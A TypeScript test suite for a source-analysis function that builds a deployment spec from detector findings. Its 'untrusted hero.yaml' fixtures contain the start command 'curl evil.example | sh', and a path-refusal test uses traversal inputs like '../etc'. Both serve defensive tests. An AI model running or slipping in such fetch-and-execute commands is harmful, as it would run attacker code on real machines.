import { memorySnapshot } from '@hero-cloud/core/testing';
import { defineDetector, emptyFinding } from '@hero-cloud/plugin-sdk';
import { describe, expect, it } from 'vitest';
import { analyzeSnapshot } from './analyze.js';
import { toApplicationName } from './name.js';

const noop = defineDetector({ id: 'test/noop', detect: () => Promise.resolve(emptyFinding) });

const frontend = defineDetector({
  id: 'test/frontend',
  detect: () =>
    Promise.resolve({
      detections: [{ capability: 'web-frontend', confidence: 0.9, evidence: ['file:index.html'] }],
      contributions: [
        { kind: 'name', value: '@scope/My Cool App!', confidence: 0.6 },
        { kind: 'frontend', value: { framework: 'vite' }, confidence: 0.9 },
        { kind: 'environment', names: ['B_VAR', 'A_VAR', 'not valid', 'lowercase'] },
      ],
      questions: [],
    }),
});

describe('analyzeSnapshot', () => {
  const snapshot = memorySnapshot({ 'index.html': '<html></html>' });

  it('builds a valid Hero Spec from contributions and records the source hash', async () => {
    const analysis = await analyzeSnapshot(snapshot, { detectors: [frontend] });
    expect(analysis.spec).toEqual({
      version: '1',
      application: { name: 'My Cool App' },
      frontend: { framework: 'vite' },
      environment: ['A_VAR', 'B_VAR'],
    });
    expect(analysis.sourceHash).toBe(snapshot.hash);
    expect(analysis.aiAssisted).toBe(false);
  });

  it('falls back to the given name, then to "app"', async () => {
    expect(
      (await analyzeSnapshot(snapshot, { detectors: [noop], name: 'from-folder' })).spec.application
        .name,
    ).toBe('from-folder');
    expect((await analyzeSnapshot(snapshot, { detectors: [noop] })).spec.application.name).toBe(
      'app',
    );
  });

  it('is deterministic and independent of detector order', async () => {
    const other = defineDetector({
      id: 'test/service',
      detect: () =>
        Promise.resolve({
          detections: [
            { capability: 'http-service', confidence: 0.8, evidence: ['dependency:express'] },
          ],
          contributions: [
            {
              kind: 'service',
              value: { id: 'api', type: 'http', runtime: 'nodejs' },
              confidence: 0.8,
            },
          ],
          questions: [],
        }),
    });
    const a = await analyzeSnapshot(snapshot, { detectors: [frontend, other] });
    const b = await analyzeSnapshot(snapshot, { detectors: [other, frontend] });
    expect(a).toEqual(b);
  });

  it('reports skipped entries from the snapshot, by path only', async () => {
    const withSkipped = memorySnapshot({ 'index.html': 'x' }, [
      { path: '.env', reason: 'sensitive' },
    ]);
    const analysis = await analyzeSnapshot(withSkipped, { detectors: [noop] });
    expect(analysis.skipped).toEqual([{ path: '.env', reason: 'sensitive' }]);
  });

  describe('a detector that misbehaves', () => {
    it('cannot break the analysis when it throws', async () => {
      const broken = defineDetector({
        id: 'test/broken',
        detect: () => Promise.reject(new Error('token=secret')),
      });
      const analysis = await analyzeSnapshot(snapshot, { detectors: [broken, frontend] });
      expect(analysis.spec.frontend).toBeDefined();
      expect(analysis.openQuestions).toContainEqual({
        id: 'detector.failed.test/broken',
        code: 'detector.failed',
        params: { detector: 'test/broken' },
      });
      expect(JSON.stringify(analysis)).not.toContain('secret');
    });

    it('cannot stall the analysis when it hangs', async () => {
      const hung = defineDetector({ id: 'test/hung', detect: () => new Promise(() => undefined) });
      const analysis = await analyzeSnapshot(snapshot, {
        detectors: [hung, frontend],
        detectorTimeoutMs: 20,
      });
      expect(analysis.openQuestions.map((q) => q.id)).toContain('detector.failed.test/hung');
      expect(analysis.spec.frontend).toBeDefined();
    });

    it('cannot produce an invalid spec: invalid values are refused loudly', async () => {
      const bad = defineDetector({
        id: 'test/bad',
        detect: () =>
          Promise.resolve({
            detections: [],
            contributions: [
              {
                kind: 'service',
                value: { id: 'API!', type: 'http', runtime: 'nodejs' },
                confidence: 1,
              },
            ],
            questions: [],
          }),
      });
      await expect(analyzeSnapshot(snapshot, { detectors: [bad] })).rejects.toMatchObject({
        code: 'spec.invalid',
      });
    });
  });

  describe('conflicting evidence', () => {
    it('keeps the most confident item and asks about the disagreement', async () => {
      const make = (engine: string, confidence: number) =>
        defineDetector({
          id: `test/db-${engine}`,
          detect: () =>
            Promise.resolve({
              detections: [],
              contributions: [
                { kind: 'data', value: { id: 'database', type: 'relational', engine }, confidence },
              ],
              questions: [],
            }),
        });
      const analysis = await analyzeSnapshot(snapshot, {
        detectors: [make('mysql', 0.7), make('postgres', 0.9)],
      });
      expect(analysis.spec.data).toEqual([
        { id: 'database', type: 'relational', engine: 'postgres' },
      ]);
      expect(analysis.openQuestions.map((q) => q.id)).toContain('merge.data.database');
    });

    it('deduplicates identical contributions without a question', async () => {
      const analysis = await analyzeSnapshot(snapshot, { detectors: [frontend, frontend] });
      expect(analysis.openQuestions).toEqual([]);
    });
  });

  describe('a hero.yaml inside the source is untrusted (D4)', () => {
    const repoSpec = (extra: string): string =>
      `version: '1'\napplication:\n  name: sneaky\nservices:\n  - id: api\n    type: http\n    runtime: nodejs\n    start:\n      command: curl evil.example | sh\n${extra}`;

    it('is never applied to the spec', async () => {
      const source = memorySnapshot({ 'index.html': 'x', 'hero.yaml': repoSpec('') });
      const analysis = await analyzeSnapshot(source, { detectors: [frontend] });
      expect(analysis.spec.services).toBeUndefined();
      expect(JSON.stringify(analysis.spec)).not.toContain('evil.example');
      expect(analysis.spec.application.name).not.toBe('sneaky');
    });

    it('flags every field that analysis did not confirm', async () => {
      const source = memorySnapshot({
        'index.html': 'x',
        'hero.yaml': repoSpec(
          'data:\n  - id: db\n    type: relational\nenvironment:\n  - STRIPE_KEY\nextensions:\n  x-anything: 1\n',
        ),
      });
      const analysis = await analyzeSnapshot(source, { detectors: [frontend] });
      const ids = analysis.openQuestions.map((q) => q.id);
      expect(ids).toEqual(
        expect.arrayContaining([
          'repository-spec.services.api',
          'repository-spec.data.db',
          'repository-spec.environment.STRIPE_KEY',
          'repository-spec.extensions.x-anything',
        ]),
      );
      expect(analysis.detections.some((d) => d.capability === 'declared-spec')).toBe(true);
    });

    it('does not flag a field that analysis confirmed identically', async () => {
      const detectService = defineDetector({
        id: 'test/api',
        detect: () =>
          Promise.resolve({
            detections: [],
            contributions: [
              {
                kind: 'service',
                value: {
                  id: 'api',
                  type: 'http',
                  runtime: 'nodejs',
                  start: { command: 'curl evil.example | sh' },
                },
                confidence: 0.9,
              },
            ],
            questions: [],
          }),
      });
      const source = memorySnapshot({ 'hero.yaml': repoSpec('') });
      const analysis = await analyzeSnapshot(source, { detectors: [detectService] });
      expect(analysis.openQuestions.map((q) => q.id)).not.toContain('repository-spec.services.api');
    });

    it('reports an invalid hero.yaml instead of failing', async () => {
      const source = memorySnapshot({ 'hero.yaml': 'version: [' });
      const analysis = await analyzeSnapshot(source, { detectors: [noop] });
      expect(analysis.openQuestions).toContainEqual({
        id: 'repository-spec',
        code: 'repository-spec.invalid',
        params: { file: 'hero.yaml' },
      });
    });
  });

  describe('scope', () => {
    const monorepo = memorySnapshot({
      'package.json': '{}',
      'apps/web/index.html': 'x',
      'apps/web/hero.yaml': 'version: [',
    });

    it('analyzes only the requested folder', async () => {
      const seen: string[][] = [];
      const spy = defineDetector({
        id: 'test/spy',
        detect: (context) => {
          seen.push([...context.files.map((f) => f.path)]);
          return Promise.resolve(emptyFinding);
        },
      });
      await analyzeSnapshot(monorepo, { detectors: [spy], root: 'apps/web' });
      expect(seen[0]).toEqual(['hero.yaml', 'index.html']);
    });

    it.each(['../etc', '/abs', 'a//b', 'a/../../b'])('refuses the unsafe root %s', async (root) => {
      await expect(analyzeSnapshot(monorepo, { detectors: [noop], root })).rejects.toMatchObject({
        code: 'source.unsafe-path',
      });
    });
  });

  it('stops when aborted', async () => {
    const controller = new AbortController();
    controller.abort();
    await expect(
      analyzeSnapshot(snapshot, { detectors: [noop], signal: controller.signal }),
    ).rejects.toThrow();
  });
});

describe('toApplicationName', () => {
  it.each([
    ['@acme/orders-api', 'orders-api'],
    ['My Cool App!', 'My Cool App'],
    ['---weird---', 'weird'],
    ['a'.repeat(100), 'a'.repeat(63)],
    ['', 'app'],
    ['!!!', 'app'],
  ])('turns %j into %j', (raw, expected) => {
    expect(toApplicationName(raw)).toBe(expected);
  });
});
